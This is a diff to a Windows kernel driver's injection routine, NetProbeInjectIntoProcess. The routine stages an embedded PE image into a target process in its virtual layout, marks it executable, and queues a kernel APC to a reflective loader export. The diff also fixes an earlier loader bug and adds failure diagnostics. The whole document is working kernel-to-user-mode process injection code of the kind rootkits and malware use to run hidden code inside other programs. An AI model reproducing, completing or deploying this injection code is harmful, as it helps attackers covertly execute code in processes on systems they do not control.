@@ -5,6 +5,7 @@
 #include "ProcessLookup.h"
 #include "RemoteInject.h"
 #include "Shared.h"
+#include <ntimage.h>
 
 //
 // Completion record the target's ReflectiveLoader writes once it is running.
@@ -37,7 +38,7 @@ NTSTATUS NetProbeInjectIntoProcess(ULONG TargetPid) {
   PVOID remoteBase = NULL;
   SIZE_T remoteSize = 0;
   PVOID statusBase = NULL;
-  SIZE_T statusSize = 16;
+  SIZE_T statusSize = 32;
   ULONG queued = 0;
   NTSTATUS status;
   ULONG poll;
@@ -50,7 +51,7 @@ NTSTATUS NetProbeInjectIntoProcess(ULONG TargetPid) {
   }
 
   DbgPrint("[LongsDriver] NetProbeInject: embedded image %llu bytes, "
-           "resolving %s.\n",
+           "resolving %s (build stamp 2026-10-04.bracefix).\n",
            (ULONGLONG)imageSize, NETPROBE_REFLECTIVE_EXPORT);
 
   status = PeFindExportByName(image, imageSize, NETPROBE_REFLECTIVE_EXPORT,
@@ -77,33 +78,75 @@ NTSTATUS NetProbeInjectIntoProcess(ULONG TargetPid) {
     return status;
   }
 
-  status = RemoteInjectImage(TargetPid, image, imageSize, PAGE_EXECUTE_READ,
-                             &remoteBase, &remoteSize);
-  if (!NT_SUCCESS(status)) {
-    DbgPrint("[LongsDriver] NetProbeInject: write to pid %lu failed 0x%X.\n",
-             TargetPid, status);
-    RemoteInjectFree(TargetPid, statusBase);
-    return status;
-  }
-
   //
-  // The loader runs from the raw copy at base + file offset. That offset, not
-  // the RVA, is what addresses the bytes the driver wrote.
+  // The staging region carries the image's *virtual* layout (headers at offset
+  // 0, sections at their RVAs), not the raw file layout. All of the loader's
+  // code uses RIP-relative addressing for its literals and globals, which only
+  // resolve to the right bytes when the image sits at its advertising layout.
+  // The raw file copy (sections at PointerToRawData) left every literal pointing
+  // at garbage - that was the step-13 "kernel32.dll not found" bug.
   //
   {
-    PVOID routine = (PUCHAR)remoteBase + location.FileOffset;
-    DbgPrint("[LongsDriver] NetProbeInject: raw image at %p, loader at %p, "
-             "status %p.\n",
-             remoteBase, routine, statusBase);
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)image;
+    PIMAGE_NT_HEADERS64 nt =
+        (PIMAGE_NT_HEADERS64)((const UCHAR *)image + dos->e_lfanew);
+    const IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);
+    SIZE_T stagingSize = nt->OptionalHeader.SizeOfImage;
+    USHORT sectionIdx;
 
-    status = ApcInjectQueueToProcess(TargetPid, routine, statusBase, &queued);
+    status = RemoteInjectAllocate(TargetPid, &stagingSize, PAGE_READWRITE,
+                                  &remoteBase);
+    if (NT_SUCCESS(status))
+      status = RemoteInjectWrite(TargetPid, remoteBase, image,
+                                 nt->OptionalHeader.SizeOfHeaders);
+    for (sectionIdx = 0;
+         NT_SUCCESS(status) && sectionIdx < nt->FileHeader.NumberOfSections;
+         sectionIdx++) {
+      const IMAGE_SECTION_HEADER *section = &sections[sectionIdx];
+      SIZE_T rawSize;
+
+      if (section->SizeOfRawData == 0)
+        continue;
+      rawSize = section->SizeOfRawData;
+      if (section->VirtualAddress < nt->OptionalHeader.SizeOfImage &&
+          rawSize > nt->OptionalHeader.SizeOfImage - section->VirtualAddress)
+        rawSize = nt->OptionalHeader.SizeOfImage - section->VirtualAddress;
+      status = RemoteInjectWrite(
+          TargetPid, (PUCHAR)remoteBase + section->VirtualAddress,
+          (const UCHAR *)image + section->PointerToRawData, rawSize);
+    }
+    if (NT_SUCCESS(status))
+      status = RemoteInjectProtect(TargetPid, remoteBase, stagingSize,
+                                   PAGE_EXECUTE_READ, NULL);
     if (!NT_SUCCESS(status)) {
-      DbgPrint("[LongsDriver] NetProbeInject: APC queue to pid %lu failed "
-               "0x%X.\n",
-               TargetPid, status);
       RemoteInjectFree(TargetPid, remoteBase);
       RemoteInjectFree(TargetPid, statusBase);
+      DbgPrint("[LongsDriver] NetProbeInject: staging image in pid %lu failed "
+               "0x%X.\n",
+               TargetPid, status);
       return status;
+    }
+    remoteSize = stagingSize;
+
+    //
+    // The loader executes out of the staging region; in the virtual layout its
+    // code sits at base + Rva, which is also the callback address for the APC.
+    //
+    {
+      PVOID routine = (PUCHAR)remoteBase + location.Rva;
+      DbgPrint("[LongsDriver] NetProbeInject: staging image at %p (%llu bytes), "
+               "loader at %p, status %p.\n",
+               remoteBase, (ULONGLONG)stagingSize, routine, statusBase);
+
+      status = ApcInjectQueueToProcess(TargetPid, routine, statusBase, &queued);
+      if (!NT_SUCCESS(status)) {
+        DbgPrint("[LongsDriver] NetProbeInject: APC queue to pid %lu failed "
+                 "0x%X.\n",
+                 TargetPid, status);
+        RemoteInjectFree(TargetPid, remoteBase);
+        RemoteInjectFree(TargetPid, statusBase);
+        return status;
+      }
     }
   }
 
@@ -144,12 +187,25 @@ NTSTATUS NetProbeInjectIntoProcess(ULONG TargetPid) {
       RemoteInjectRead(TargetPid,
                        (PUCHAR)statusBase + RL_STATUS_OFFSET_BASE,
                        &mappedBase, sizeof(mappedBase));
-      RemoteInjectRead(TargetPid, (PUCHAR)statusBase + 12, &step,
+      RemoteInjectRead(TargetPid, (PUCHAR)statusBase + 16, &step,
                        sizeof(step));
 
-      DbgPrint("[LongsDriver] NetProbeInject: loader completed, mapped base "
-               "%p, fail step %lu.\n",
-               (PVOID)mappedBase, step);
+      if (step == 17) {
+        ULONG stage = 0;
+        char dllName[33];
+
+        RemoteInjectRead(TargetPid, (PUCHAR)statusBase + 24, &stage,
+                         sizeof(stage));
+        RemoteInjectRead(TargetPid, (PUCHAR)statusBase + 28, dllName, 32);
+        dllName[32] = '\0';
+        DbgPrint("[LongsDriver] NetProbeInject: loader completed, mapped base "
+                 "%p, fail step %lu, bind stage %lu: '%s'.\n",
+                 (PVOID)mappedBase, step, stage, dllName);
+      } else {
+        DbgPrint("[LongsDriver] NetProbeInject: loader completed, mapped base "
+                 "%p, fail step %lu.\n",
+                 (PVOID)mappedBase, step);
+      }
 
       //
       // Deliberately do not release remoteBase or statusBase here.
